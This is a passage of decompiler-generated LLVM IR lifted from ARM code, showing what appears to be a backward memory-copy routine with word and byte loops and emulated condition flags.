  %v4_fc90 = mul i32 %v5_fc84, 256
  %v5_fc90 = or i32 %v4_fc90, %v3_fc8c
  store i32 %v5_fc90, i32* %r4.global-to-local, align 4
  %v3_fc94 = udiv i32 %v5_fc84, 16777216
  %v4_fc98 = mul i32 %v8_fc84, 256
  %v5_fc98 = or i32 %v4_fc98, %v3_fc94
  store i32 %v5_fc98, i32* %r5.global-to-local, align 4
  %v3_fc9c = udiv i32 %v8_fc84, 16777216
  %v4_fca0 = mul i32 %v11_fc84, 256
  %v5_fca0 = or i32 %v4_fca0, %v3_fc9c
  store i32 %v5_fca0, i32* @ip, align 4
  %v1_fca4 = inttoptr i32 %v0_fca4 to i32*
  store i32 %v5_fc88, i32* %v1_fca4, align 4
  %v3_fca4 = add i32 %v0_fca4, 4
  %v4_fca4 = inttoptr i32 %v3_fca4 to i32*
  %v5_fca4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_fca4, i32* %v4_fca4, align 4
  %v6_fca4 = add i32 %v0_fca4, 8
  %v7_fca4 = inttoptr i32 %v6_fca4 to i32*
  %v8_fca4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_fca4, i32* %v7_fca4, align 4
  %v9_fca4 = add i32 %v0_fca4, 12
  %v10_fca4 = inttoptr i32 %v9_fca4 to i32*
  %v11_fca4 = load i32, i32* @ip, align 4
  store i32 %v11_fca4, i32* %v10_fca4, align 4
  %v12_fca4 = add i32 %v0_fca4, 16
  store i32 %v12_fca4, i32* %r0.global-to-local, align 4
  %v0_fca8 = load i32, i32* %r2.global-to-local, align 4
  %v2_fca8 = add i32 %v0_fca8, -16
  store i32 %v2_fca8, i32* %r2.global-to-local, align 4
  %v6_fcac = icmp slt i32 %v0_fca8, 16
  br i1 %v6_fcac, label %dec_label_pc_fcb0, label %dec_label_pc_fc80.dec_label_pc_fc80_crit_edge

dec_label_pc_fc80.dec_label_pc_fc80_crit_edge:    ; preds = %dec_label_pc_fc80
  %v0_fc80.pre = load i32, i32* @lr, align 4
  %v0_fc84.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_fc80

dec_label_pc_fcb0:                                ; preds = %dec_label_pc_fc80
  %v2_fcb0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_fcb0, i32* @r4, align 4
  %v5_fcb0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_fcb0, i32* @r5, align 4
  %v2_fcb4 = add i32 %v0_fca8, -4
  store i32 %v2_fcb4, i32* %r2.global-to-local, align 4
  %v4_fcb4 = add i32 %v0_fca8, 2147483632
  %v5_fcb4 = and i32 %v2_fcb4, %v4_fcb4
  %v6_fcb4 = icmp slt i32 %v5_fcb4, 0
  store i1 %v6_fcb4, i1* %cpsr_v.global-to-local, align 1
  %v7_fcb4 = icmp slt i32 %v2_fcb4, 0
  store i1 %v7_fcb4, i1* %cpsr_n.global-to-local, align 1
  %v5_fcb8 = icmp slt i32 %v2_fca8, -12
  br i1 %v5_fcb8, label %dec_label_pc_fcd4, label %dec_label_pc_fcbc

dec_label_pc_fcbc:                                ; preds = %dec_label_pc_fc70, %dec_label_pc_fcb0, %dec_label_pc_fcbc
  %v1_fcc8 = phi i32 [ %v4_fcc8, %dec_label_pc_fcbc ], [ %v0_fbcc74, %dec_label_pc_fc70 ], [ %v12_fca4, %dec_label_pc_fcb0 ]
  %v0_fcbc = load i32, i32* @lr, align 4
  %v3_fcbc = udiv i32 %v0_fcbc, 16777216
  store i32 %v3_fcbc, i32* %ip.global-to-local, align 4
  %v0_fcc0 = load i32, i32* %r1.global-to-local, align 4
  %v1_fcc0 = inttoptr i32 %v0_fcc0 to i32*
  %v2_fcc0 = load i32, i32* %v1_fcc0, align 4
  store i32 %v2_fcc0, i32* @lr, align 4
  %v4_fcc0 = add i32 %v0_fcc0, 4
  store i32 %v4_fcc0, i32* %r1.global-to-local, align 4
  %v4_fcc4 = mul i32 %v2_fcc0, 256
  %v5_fcc4 = or i32 %v4_fcc4, %v3_fcbc
  store i32 %v5_fcc4, i32* @ip, align 4
  %v2_fcc8 = inttoptr i32 %v1_fcc8 to i32*
  store i32 %v5_fcc4, i32* %v2_fcc8, align 4
  %v3_fcc8 = load i32, i32* %r0.global-to-local, align 4
  %v4_fcc8 = add i32 %v3_fcc8, 4
  store i32 %v4_fcc8, i32* %r0.global-to-local, align 4
  %v0_fccc = load i32, i32* %r2.global-to-local, align 4
  %v2_fccc = add i32 %v0_fccc, -4
  store i32 %v2_fccc, i32* %r2.global-to-local, align 4
  %v6_fcd0 = icmp slt i32 %v0_fccc, 4
  br i1 %v6_fcd0, label %dec_label_pc_fcd4.loopexit, label %dec_label_pc_fcbc

dec_label_pc_fcd4.loopexit:                       ; preds = %dec_label_pc_fcbc
  %v4_fccc = sub i32 3, %v0_fccc
  %v5_fccc = and i32 %v4_fccc, %v0_fccc
  %v6_fccc = icmp slt i32 %v5_fccc, 0
  %v7_fccc = icmp slt i32 %v2_fccc, 0
  store i1 %v6_fccc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_fccc, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_fcd4

dec_label_pc_fcd4:                                ; preds = %dec_label_pc_fcd4.loopexit, %dec_label_pc_fcb0
  %v2_fb3c111 = phi i32 [ %v4_fcc8, %dec_label_pc_fcd4.loopexit ], [ %v12_fca4, %dec_label_pc_fcb0 ]
  %v0_fb2c107 = phi i32 [ %v2_fccc, %dec_label_pc_fcd4.loopexit ], [ %v2_fcb4, %dec_label_pc_fcb0 ]
  %v0_fcd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_fcd4 = add i32 %v0_fcd4, -1
  store i32 %v1_fcd4, i32* @r1, align 4
  br label %bb132

dec_label_pc_fcdc:                                ; preds = %entry
  %v1_fcdc = load i32, i32* @r2, align 4
  %v2_fcdc = add i32 %v1_fcdc, %v0_fa90
  store i32 %v2_fcdc, i32* @r1, align 4
  %v2_fce0 = add i32 %v1_fcdc, %v1_fa90
  store i32 %v2_fce0, i32* %r0.global-to-local, align 4
  %v2_fce4 = add i32 %v1_fcdc, -4
  store i32 %v2_fce4, i32* %r2.global-to-local, align 4
  %v4_fce4 = sub i32 3, %v1_fcdc
  %v5_fce4 = and i32 %v4_fce4, %v1_fcdc
  %v6_fce4 = icmp slt i32 %v5_fce4, 0
  store i1 %v6_fce4, i1* %cpsr_v.global-to-local, align 1
  %v7_fce4 = icmp slt i32 %v2_fce4, 0
  store i1 %v7_fce4, i1* %cpsr_n.global-to-local, align 1
  %v5_fce8 = icmp slt i32 %v1_fcdc, 4
  br i1 %v5_fce8, label %bb142, label %dec_label_pc_fcec

dec_label_pc_fcec:                                ; preds = %dec_label_pc_fcdc
  %v1_fcec = urem i32 %v2_fce0, 4
  store i32 %v1_fcec, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_fcec = icmp eq i32 %v1_fcec, 0
  br i1 %v2_fcec, label %dec_label_pc_fcf4, label %dec_label_pc_fd94

dec_label_pc_fcf4:                                ; preds = %dec_label_pc_fcec
  %v1_fcf4 = urem i32 %v2_fcdc, 4
  store i32 %v1_fcf4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_fcf4 = icmp eq i32 %v1_fcf4, 0
  br i1 %v2_fcf4, label %dec_label_pc_fcfc, label %dec_label_pc_fdc0

dec_label_pc_fcfc:                                ; preds = %dec_label_pc_fcf4, %dec_label_pc_fdb8
  %v0_fd1448 = phi i32 [ %v2_fce0, %dec_label_pc_fcf4 ], [ %v0_fe0831, %dec_label_pc_fdb8 ]
  %v0_fd1047 = phi i32 [ %v2_fcdc, %dec_label_pc_fcf4 ], [ %v0_fdb8, %dec_label_pc_fdb8 ]
  %v0_fcfc = phi i32 [ %v2_fce4, %dec_label_pc_fcf4 ], [ %v2_fdb0, %dec_label_pc_fdb8 ]
  %v2_fcfc = add i32 %v0_fcfc, -8
  store i32 %v2_fcfc, i32* %r2.global-to-local, align 4
  %v4_fcfc = sub i32 7, %v0_fcfc
  %v5_fcfc = and i32 %v4_fcfc, %v0_fcfc
  %v6_fcfc = icmp slt i32 %v5_fcfc, 0
  store i1 %v6_fcfc, i1* %cpsr_v.global-to-local, align 1
  %v7_fcfc = icmp slt i32 %v2_fcfc, 0
  store i1 %v7_fcfc, i1* %cpsr_n.global-to-local, align 1
  %v5_fd00 = icmp slt i32 %v0_fcfc, 8
  br i1 %v5_fd00, label %dec_label_pc_fd4c, label %dec_label_pc_fd04

dec_label_pc_fd04:                                ; preds = %dec_label_pc_fcfc
  %v3_fd04 = load i32, i32* @r4, align 4
  %v5_fd04 = inttoptr i32 %v3_fd04 to i8*
  store i8* %v5_fd04, i8** %stack_var_-8, align 4
  %v8_fd04 = load i32, i32* @lr, align 4
  %v2_fd08 = add i32 %v0_fcfc, -28
  store i32 %v2_fd08, i32* %r2.global-to-local, align 4
  %v4_fd08 = sub i32 27, %v0_fcfc
  %v5_fd08 = and i32 %v4_fd08, %v2_fcfc
  %v6_fd08 = icmp slt i32 %v5_fd08, 0
  store i1 %v6_fd08, i1* %cpsr_v.global-to-local, align 1
  %v7_fd08 = icmp slt i32 %v2_fd08, 0
  store i1 %v7_fd08, i1* %cpsr_n.global-to-local, align 1
  %v5_fd0c = icmp slt i32 %v2_fcfc, 20
  br i1 %v5_fd0c, label %dec_label_pc_fd28, label %dec_label_pc_fd10

dec_label_pc_fd10:                                ; preds = %dec_label_pc_fd04, %dec_label_pc_fd10.dec_label_pc_fd10_crit_edge
  %v0_fd14 = phi i32 [ %v1_fd1c, %dec_label_pc_fd10.dec_label_pc_fd10_crit_edge ], [ %v0_fd1448, %dec_label_pc_fd04 ]
  %v0_fd10 = phi i32 [ %v0_fd10.pre, %dec_label_pc_fd10.dec_label_pc_fd10_crit_edge ], [ %v0_fd1047, %dec_label_pc_fd04 ]
  %v1_fd10 = add i32 %v0_fd10, -4
  %v2_fd10 = inttoptr i32 %v1_fd10 to i32*
  %v3_fd10 = load i32, i32* %v2_fd10, align 4
  %v4_fd10 = add i32 %v0_fd10, -8
  %v5_fd10 = inttoptr i32 %v4_fd10 to i32*
  %v6_fd10 = load i32, i32* %v5_fd10, align 4
  store i32 %v6_fd10, i32* %r4.global-to-local, align 4
  %v7_fd10 = add i32 %v0_fd10, -12
  %v8_fd10 = inttoptr i32 %v7_fd10 to i32*
  %v9_fd10 = load i32, i32* %v8_fd10, align 4
  store i32 %v9_fd10, i32* %ip.global-to-local, align 4
  %v10_fd10 = add i32 %v0_fd10, -16
  %v11_fd10 = inttoptr i32 %v10_fd10 to i32*
  %v12_fd10 = load i32, i32* %v11_fd10, align 4
  store i32 %v12_fd10, i32* %lr.global-to-local, align 4
  store i32 %v10_fd10, i32* %r1.global-to-local, align 4
  %v1_fd14 = add i32 %v0_fd14, -16
  %v2_fd14 = inttoptr i32 %v1_fd14 to i32*
  store i32 %v3_fd10, i32* %v2_fd14, align 4
  %v4_fd14 = add i32 %v0_fd14, -12
  %v5_fd14 = inttoptr i32 %v4_fd14 to i32*
  %v6_fd14 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_fd14, i32* %v5_fd14, align 4
  %v7_fd14 = add i32 %v0_fd14, -8
  %v8_fd14 = inttoptr i32 %v7_fd14 to i32*
  %v9_fd14 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_fd14, i32* %v8_fd14, align 4
  %v10_fd14 = add i32 %v0_fd14, -4
  %v11_fd14 = inttoptr i32 %v10_fd14 to i32*
  %v12_fd14 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_fd14, i32* %v11_fd14, align 4
  store i32 %v1_fd14, i32* %r0.global-to-local, align 4
  %v0_fd18 = load i32, i32* %r1.global-to-local, align 4
  %v1_fd18 = add i32 %v0_fd18, -4
  %v2_fd18 = inttoptr i32 %v1_fd18 to i32*
  %v3_fd18 = load i32, i32* %v2_fd18, align 4
  store i32 %v3_fd18, i32* @r3, align 4
  %v4_fd18 = add i32 %v0_fd18, -8
  %v5_fd18 = inttoptr i32 %v4_fd18 to i32*
  %v6_fd18 = load i32, i32* %v5_fd18, align 4
  store i32 %v6_fd18, i32* %r4.global-to-local, align 4
  %v7_fd18 = add i32 %v0_fd18, -12
  %v8_fd18 = inttoptr i32 %v7_fd18 to i32*
  %v9_fd18 = load i32, i32* %v8_fd18, align 4
  store i32 %v9_fd18, i32* @ip, align 4
  %v10_fd18 = add i32 %v0_fd18, -16
  %v11_fd18 = inttoptr i32 %v10_fd18 to i32*
  %v12_fd18 = load i32, i32* %v11_fd18, align 4
  store i32 %v12_fd18, i32* %lr.global-to-local, align 4
  store i32 %v10_fd18, i32* @r1, align 4
  %v1_fd1c = add i32 %v0_fd14, -32
  %v2_fd1c = inttoptr i32 %v1_fd1c to i32*
  store i32 %v3_fd18, i32* %v2_fd1c, align 4
  %v4_fd1c = add i32 %v0_fd14, -28
  %v5_fd1c = inttoptr i32 %v4_fd1c to i32*
  %v6_fd1c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_fd1c, i32* %v5_fd1c, align 4
  %v7_fd1c = add i32 %v0_fd14, -24
  %v8_fd1c = inttoptr i32 %v7_fd1c to i32*
  %v9_fd1c = load i32, i32* @ip, align 4
  store i32 %v9_fd1c, i32* %v8_fd1c, align 4
  %v10_fd1c = add i32 %v0_fd14, -20
  %v11_fd1c = inttoptr i32 %v10_fd1c to i32*
  %v12_fd1c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_fd1c, i32* %v11_fd1c, align 4
  store i32 %v1_fd1c, i32* %r0.global-to-local, align 4
  %v0_fd20 = load i32, i32* %r2.global-to-local, align 4
  %v2_fd20 = add i32 %v0_fd20, -32
  store i32 %v2_fd20, i32* %r2.global-to-local, align 4
  %v6_fd24 = icmp slt i32 %v0_fd20, 32
  br i1 %v6_fd24, label %dec_label_pc_fd28.loopexit, label %dec_label_pc_fd10.dec_label_pc_fd10_crit_edge

dec_label_pc_fd10.dec_label_pc_fd10_crit_edge:    ; preds = %dec_label_pc_fd10
  %v0_fd10.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_fd10

dec_label_pc_fd28.loopexit:                       ; preds = %dec_label_pc_fd10
  %v4_fd20 = sub i32 31, %v0_fd20
  %v5_fd20 = and i32 %v4_fd20, %v0_fd20
  %v6_fd20 = icmp slt i32 %v5_fd20, 0
  %v7_fd20 = icmp slt i32 %v2_fd20, 0
  store i1 %v6_fd20, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_fd20, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_fd28

dec_label_pc_fd28:                                ; preds = %dec_label_pc_fd28.loopexit, %dec_label_pc_fd04
  %v6_fd30 = phi i32 [ %v1_fd1c, %dec_label_pc_fd28.loopexit ], [ %v0_fd1448, %dec_label_pc_fd04 ]
  %v0_fd38.pr = phi i32 [ %v2_fd20, %dec_label_pc_fd28.loopexit ], [ %v2_fd08, %dec_label_pc_fd04 ]
  %v4_fd28 = add i32 %v0_fd38.pr, 16
  %v6_fd28 = sub i32 0, %v0_fd38.pr
  %v7_fd28 = and i32 %v4_fd28, %v6_fd28
  %v8_fd28 = icmp slt i32 %v7_fd28, 0
  store i1 %v8_fd28, i1* %cpsr_v.global-to-local, align 1
  %v9_fd28 = icmp slt i32 %v4_fd28, 0
  store i1 %v9_fd28, i1* %cpsr_n.global-to-local, align 1
  %v5_fd2c = icmp slt i32 %v0_fd38.pr, -16
  br i1 %v5_fd2c, label %.thread13, label %bb139

bb139:                                            ; preds = %dec_label_pc_fd28
  %v6_fd2c = load i32, i32* @r1, align 4
  %v7_fd2c = add i32 %v6_fd2c, -4
  %v8_fd2c = inttoptr i32 %v7_fd2c to i32*
  %v9_fd2c = load i32, i32* %v8_fd2c, align 4
  store i32 %v9_fd2c, i32* @r3, align 4
  %v10_fd2c = add i32 %v6_fd2c, -8
  %v11_fd2c = inttoptr i32 %v10_fd2c to i32*
  %v12_fd2c = load i32, i32* %v11_fd2c, align 4
  store i32 %v12_fd2c, i32* %r4.global-to-local, align 4
  %v13_fd2c = add i32 %v6_fd2c, -12
  %v14_fd2c = inttoptr i32 %v13_fd2c to i32*
  %v15_fd2c = load i32, i32* %v14_fd2c, align 4
  store i32 %v15_fd2c, i32* @ip, align 4
  %v16_fd2c = add i32 %v6_fd2c, -16
  %v17_fd2c = inttoptr i32 %v16_fd2c to i32*
  %v18_fd2c = load i32, i32* %v17_fd2c, align 4
  store i32 %v18_fd2c, i32* %lr.global-to-local, align 4
  store i32 %v16_fd2c, i32* @r1, align 4
  %v7_fd30 = add i32 %v6_fd30, -16
  %v8_fd30 = inttoptr i32 %v7_fd30 to i32*
  store i32 %v9_fd2c, i32* %v8_fd30, align 4
  %v10_fd30 = add i32 %v6_fd30, -12
  %v11_fd30 = inttoptr i32 %v10_fd30 to i32*
  %v12_fd30 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_fd30, i32* %v11_fd30, align 4
  %v13_fd30 = add i32 %v6_fd30, -8
  %v14_fd30 = inttoptr i32 %v13_fd30 to i32*
  %v15_fd30 = load i32, i32* @ip, align 4
  store i32 %v15_fd30, i32* %v14_fd30, align 4
  %v16_fd30 = add i32 %v6_fd30, -4
  %v17_fd30 = inttoptr i32 %v16_fd30 to i32*
  %v18_fd30 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_fd30, i32* %v17_fd30, align 4
  store i32 %v7_fd30, i32* %r0.global-to-local, align 4
  %v6_fd34 = load i32, i32* %r2.global-to-local, align 4
  %v7_fd34 = add i32 %v6_fd34, -16
  store i32 %v7_fd34, i32* %r2.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_fd28, %bb139
  %v6_fd40 = phi i32 [ %v7_fd30, %bb139 ], [ %v6_fd30, %dec_label_pc_fd28 ]
  %v0_fd38 = phi i32 [ %v7_fd34, %bb139 ], [ %v0_fd38.pr, %dec_label_pc_fd28 ]
  %v4_fd38 = add i32 %v0_fd38, 20
  store i32 %v4_fd38, i32* %r2.global-to-local, align 4
  %v6_fd38 = sub i32 0, %v0_fd38
  %v7_fd38 = and i32 %v4_fd38, %v6_fd38
  %v8_fd38 = icmp slt i32 %v7_fd38, 0
  store i1 %v8_fd38, i1* %cpsr_v.global-to-local, align 1
  %v9_fd38 = icmp slt i32 %v4_fd38, 0
  store i1 %v9_fd38, i1* %cpsr_n.global-to-local, align 1
  %v5_fd3c = icmp slt i32 %v0_fd38, -20
  br i1 %v5_fd3c, label %.thread15, label %bb140

bb140:                                            ; preds = %.thread13
  %v6_fd3c = load i32, i32* @r1, align 4
  %v7_fd3c = add i32 %v6_fd3c, -4
  %v8_fd3c = inttoptr i32 %v7_fd3c to i32*
  %v9_fd3c = load i32, i32* %v8_fd3c, align 4
  store i32 %v9_fd3c, i32* @r3, align 4
  %v10_fd3c = add i32 %v6_fd3c, -8
  %v11_fd3c = inttoptr i32 %v10_fd3c to i32*
  %v12_fd3c = load i32, i32* %v11_fd3c, align 4
  store i32 %v12_fd3c, i32* @ip, align 4
  %v13_fd3c = add i32 %v6_fd3c, -12
  %v14_fd3c = inttoptr i32 %v13_fd3c to i32*
  %v15_fd3c = load i32, i32* %v14_fd3c, align 4
  store i32 %v15_fd3c, i32* %lr.global-to-local, align 4
  store i32 %v13_fd3c, i32* @r1, align 4
  %v7_fd40 = add i32 %v6_fd40, -12
  %v8_fd40 = inttoptr i32 %v7_fd40 to i32*
  store i32 %v9_fd3c, i32* %v8_fd40, align 4
  %v10_fd40 = add i32 %v6_fd40, -8
  %v11_fd40 = inttoptr i32 %v10_fd40 to i32*
  %v12_fd40 = load i32, i32* @ip, align 4
  store i32 %v12_fd40, i32* %v11_fd40, align 4
  %v13_fd40 = add i32 %v6_fd40, -4
  %v14_fd40 = inttoptr i32 %v13_fd40 to i32*
  %v15_fd40 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_fd40, i32* %v14_fd40, align 4
  store i32 %v7_fd40, i32* %r0.global-to-local, align 4
  %v6_fd44 = load i32, i32* %r2.global-to-local, align 4
  %v7_fd44 = add i32 %v6_fd44, -12
  store i32 %v7_fd44, i32* %r2.global-to-local, align 4
  br label %.thread15

.thread15:                                        ; preds = %.thread13, %bb140
  %v6_fd6456 = phi i32 [ %v6_fd40, %.thread13 ], [ %v7_fd40, %bb140 ]
  %v0_fd4c54 = phi i32 [ %v4_fd38, %.thread13 ], [ %v7_fd44, %bb140 ]
  %v2_fd48 = load i8*, i8** %stack_var_-8, align 4
  %v3_fd48 = ptrtoint i8* %v2_fd48 to i32
  store i32 %v3_fd48, i32* @r4, align 4
  store i32 %v8_fd04, i32* @lr, align 4
  br label %dec_label_pc_fd4c

dec_label_pc_fd4c:                                ; preds = %dec_label_pc_fcfc, %.thread15
  %v7_fd5c = phi i32 [ %v0_fd1448, %dec_label_pc_fcfc ], [ %v6_fd6456, %.thread15 ]
  %v0_fd4c = phi i32 [ %v2_fcfc, %dec_label_pc_fcfc ], [ %v0_fd4c54, %.thread15 ]
  %v2_fd4c = add i32 %v0_fd4c, 8
  store i32 %v2_fd4c, i32* %r2.global-to-local, align 4
  %v4_fd4c = sub i32 0, %v0_fd4c
  %v5_fd4c = and i32 %v2_fd4c, %v4_fd4c
  %v6_fd4c = icmp slt i32 %v5_fd4c, 0
  store i1 %v6_fd4c, i1* %cpsr_v.global-to-local, align 1
  %v7_fd4c = icmp slt i32 %v2_fd4c, 0
  store i1 %v7_fd4c, i1* %cpsr_n.global-to-local, align 1
  %v5_fd50 = icmp slt i32 %v0_fd4c, -8
  br i1 %v5_fd50, label %bb142, label %dec_label_pc_fd54

dec_label_pc_fd54:                                ; preds = %dec_label_pc_fd4c
  %v6_fd54 = add i32 %v0_fd4c, 4
  store i32 %v6_fd54, i32* %r2.global-to-local, align 4
  %v8_fd54 = sub i32 -5, %v0_fd4c
  %v9_fd54 = and i32 %v8_fd54, %v2_fd4c
  %v10_fd54 = icmp slt i32 %v9_fd54, 0
  store i1 %v10_fd54, i1* %cpsr_v.global-to-local, align 1
  %v11_fd54 = icmp slt i32 %v6_fd54, 0
  store i1 %v11_fd54, i1* %cpsr_n.global-to-local, align 1
  %v5_fd58 = icmp slt i32 %v2_fd4c, 4
  %v6_fd58 = load i32, i32* @r1, align 4
  %v7_fd58 = add i32 %v6_fd58, -4
  %v8_fd58 = inttoptr i32 %v7_fd58 to i32*
  %v9_fd58 = load i32, i32* %v8_fd58, align 4
  store i32 %v9_fd58, i32* @r3, align 4
  br i1 %v5_fd58, label %.thread19, label %bb141

.thread19:                                        ; preds = %dec_label_pc_fd54
  store i32 %v7_fd58, i32* @r1, align 4
  %v8_fd5c = add i32 %v7_fd5c, -4
  %v9_fd5c = inttoptr i32 %v8_fd5c to i32*
  store i32 %v9_fd58, i32* %v9_fd5c, align 4
  %v10_fd5c = load i32, i32* %r0.global-to-local, align 4
  %v11_fd5c = add i32 %v10_fd5c, -4
  store i32 %v11_fd5c, i32* %r0.global-to-local, align 4
  %v0_fd6c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb142

bb141:                                            ; preds = %dec_label_pc_fd54
  %v10_fd60 = add i32 %v6_fd58, -8
  %v11_fd60 = inttoptr i32 %v10_fd60 to i32*
  %v12_fd60 = load i32, i32* %v11_fd60, align 4
  store i32 %v12_fd60, i32* @ip, align 4
  store i32 %v10_fd60, i32* @r1, align 4
  %v7_fd64 = add i32 %v7_fd5c, -8
  %v8_fd64 = inttoptr i32 %v7_fd64 to i32*
  store i32 %v9_fd58, i32* %v8_fd64, align 4
  %v10_fd64 = add i32 %v7_fd5c, -4
  %v11_fd64 = inttoptr i32 %v10_fd64 to i32*
  %v12_fd64 = load i32, i32* @ip, align 4
  store i32 %v12_fd64, i32* %v11_fd64, align 4
  store i32 %v7_fd64, i32* %r0.global-to-local, align 4
  %v6_fd68 = load i32, i32* %r2.global-to-local, align 4
  %v7_fd68 = add i32 %v6_fd68, -4
  store i32 %v7_fd68, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %.thread19, %.thread25, %dec_label_pc_fd4c, %dec_label_pc_fcdc, %dec_label_pc_ff10, %dec_label_pc_fea4, %dec_label_pc_fe38, %bb141
  %v2_fd70 = phi i32 [ %v11_fd5c, %.thread19 ], [ %v0_fe0831, %.thread25 ], [ %v7_fd5c, %dec_label_pc_fd4c ], [ %v2_fce0, %dec_label_pc_fcdc ], [ %v2_fd7c64, %dec_label_pc_ff10 ], [ %v2_fd7c63, %dec_label_pc_fea4 ], [ %v2_fd7c62, %dec_label_pc_fe38 ], [ %v7_fd64, %bb141 ]
  %v0_fd6c = phi i32 [ %v0_fd6c.pre, %.thread19 ], [ %v2_fdb0, %.thread25 ], [ %v2_fd4c, %dec_label_pc_fd4c ], [ %v2_fce4, %dec_label_pc_fcdc ], [ %v0_fd6c60, %dec_label_pc_ff10 ], [ %v0_fd6c59, %dec_label_pc_fea4 ], [ %v0_fd6c58, %dec_label_pc_fe38 ], [ %v7_fd68, %bb141 ]
  %v1_fd6c = add i32 %v0_fd6c, 4
  store i32 %v1_fd6c, i32* @r2, align 4
  %v3_fd6c = sub i32 0, %v0_fd6c
  %v4_fd6c = and i32 %v1_fd6c, %v3_fd6c
  %v5_fd6c = icmp slt i32 %v4_fd6c, 0
  store i1 %v5_fd6c, i1* %cpsr_v.global-to-local, align 1
  %v6_fd6c = icmp slt i32 %v1_fd6c, 0
  store i1 %v6_fd6c, i1* %cpsr_n.global-to-local, align 1
  %v7_fd6c = icmp eq i32 %v1_fd6c, 0
  store i1 %v7_fd6c, i1* @cpsr_z, align 1
  br i1 %v7_fd6c, label %.thread122, label %bb143

bb143:                                            ; preds = %bb142
  %v1_fd74 = add i32 %v0_fd6c, 2
  %v3_fd74 = sub i32 -3, %v0_fd6c
  %v4_fd74 = and i32 %v3_fd74, %v1_fd6c
  %v5_fd74 = icmp slt i32 %v4_fd74, 0
  store i1 %v5_fd74, i1* %cpsr_v.global-to-local, align 1
  %v6_fd74 = icmp slt i32 %v1_fd74, 0
  store i1 %v6_fd74, i1* %cpsr_n.global-to-local, align 1
  %v7_fd74 = icmp eq i32 %v1_fd6c, 2
  store i1 %v7_fd74, i1* @cpsr_z, align 1
  %v0_fd78 = load i32, i32* @r1, align 4
  %v1_fd78 = add i32 %v0_fd78, -1
  %v2_fd78 = inttoptr i32 %v1_fd78 to i8*
  %v3_fd78 = load i8, i8* %v2_fd78, align 1
  %v4_fd78 = zext i8 %v3_fd78 to i32
  store i32 %v4_fd78, i32* @r3, align 4
  store i32 %v1_fd78, i32* @r1, align 4
  %v3_fd7c = add i32 %v2_fd70, -1
  %v4_fd7c = inttoptr i32 %v3_fd7c to i8*
  store i8 %v3_fd78, i8* %v4_fd7c, align 1
  %v5_fd7c = load i32, i32* %r0.global-to-local, align 4
  %v6_fd7c = add i32 %v5_fd7c, -1
  store i32 %v6_fd7c, i32* %r0.global-to-local, align 4
  %v0_fd80 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_fd80 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_fd80 = xor i1 %v0_fd80, %v1_fd80
  br i1 %v2_fd80, label %.thread121, label %bb144

bb144:                                            ; preds = %bb143
  %v3_fd80 = load i32, i32* @r1, align 4
  %v4_fd80 = add i32 %v3_fd80, -1
  %v5_fd80 = inttoptr i32 %v4_fd80 to i8*
  %v6_fd80 = load i8, i8* %v5_fd80, align 1
  %v7_fd80 = zext i8 %v6_fd80 to i32
  store i32 %v7_fd80, i32* @r3, align 4
  store i32 %v4_fd80, i32* @r1, align 4
  %v6_fd84 = add i32 %v5_fd7c, -2
  %v7_fd84 = inttoptr i32 %v6_fd84 to i8*
  store i8 %v6_fd80, i8* %v7_fd84, align 1
  %v8_fd84 = load i32, i32* %r0.global-to-local, align 4
  %v9_fd84 = add i32 %v8_fd84, -1
  store i32 %v9_fd84, i32* %r0.global-to-local, align 4
  %v1_fd88.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_fd88.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread121

.thread121:                                       ; preds = %bb143, %bb144
  %v7_fd8c = phi i32 [ %v9_fd84, %bb144 ], [ %v6_fd7c, %bb143 ]
  %v2_fd8c = phi i1 [ %v2_fd88.pre, %bb144 ], [ %v1_fd80, %bb143 ]
  %v1_fd8c = phi i1 [ %v1_fd88.pre, %bb144 ], [ %v0_fd80, %bb143 ]
  %v0_fd88 = load i1, i1* @cpsr_z, align 1
  %v3_fd88 = xor i1 %v2_fd8c, %v1_fd8c
  %v4_fd88 = or i1 %v0_fd88, %v3_fd88
  br i1 %v4_fd88, label %.thread122, label %bb145

bb145:                                            ; preds = %.thread121
  %v5_fd88 = load i32, i32* @r1, align 4
  %v6_fd88 = add i32 %v5_fd88, -1
  %v7_fd88 = inttoptr i32 %v6_fd88 to i8*
  %v8_fd88 = load i8, i8* %v7_fd88, align 1
  %v9_fd88 = zext i8 %v8_fd88 to i32
  store i32 %v9_fd88, i32* @r3, align 4
  store i32 %v6_fd88, i32* @r1, align 4
  %v8_fd8c = add i32 %v7_fd8c, -1
  %v9_fd8c = inttoptr i32 %v8_fd8c to i8*
  store i8 %v8_fd88, i8* %v9_fd8c, align 1
  %v10_fd8c = load i32, i32* %r0.global-to-local, align 4
  %v11_fd8c = add i32 %v10_fd8c, -1
  store i32 %v11_fd8c, i32* %r0.global-to-local, align 4
  br label %.thread122

dec_label_pc_fd94:                                ; preds = %dec_label_pc_fcec
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_fd94 = icmp eq i32 %v1_fcec, 1
